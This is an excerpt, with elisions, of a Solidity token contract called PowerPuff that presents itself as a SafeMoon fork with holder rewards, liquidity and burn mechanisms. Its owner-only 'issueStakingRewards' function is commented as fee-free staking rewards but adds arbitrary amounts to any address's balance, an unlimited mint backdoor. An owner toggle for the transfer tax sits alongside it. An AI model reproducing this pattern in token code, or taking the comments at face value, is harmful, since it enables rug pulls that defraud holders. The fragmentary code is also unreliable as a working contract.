...
/*
    PowerPuff is a SafeMoon fork with the following mechanisms:
        - Bubbles is the stake free farming function, this takes 3% off of each transaction and redistributes to holders. Every time someone buys or sells, the amount of tokens in your wallet will increase.
        - Blossom is the automatic Liquidity Aggregator, this function takes 2% from each transaction and stores in token contract and to be used to create new LPs. This will constantly drive the baseline liquidity and increase the amount of BNB in pool.
        - Buttercup is the 1% burn per transaction. Every time a transaction is made 1% from each of those transactions is forever burned away, increasing scarcity of supply and decreasing tokens in circulation.
        
    PowerPuff 2021 BSC
    
    Twitter: https://twitter.com/powerpuffbsc
    Telegram: https://t.me/powerpuffbsc
*/
...
contract PowerPuff is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "PowerPuff";
    ...
    function _transfer(
        ...
        if(isTaxActive && !isExcludedFromFee[_msgSender()] && !isExcludedFromFee[recipient] && !inSwapAndLiquify){
    ...
    function issueStakingRewards(address recipient, uint256 amount) public onlyOwner {
        // Farm tokens for the staker without fees
        // Stakers are incentivized to lock up as they will be excluded from fees
        address sender = address(0);
        //transfer reflection
        _reflectionBalance[recipient] = _reflectionBalance[recipient].add(amount);
    ...
    function setTaxFeeActive(bool value) public onlyOwner {
        isTaxActive = value;
    }
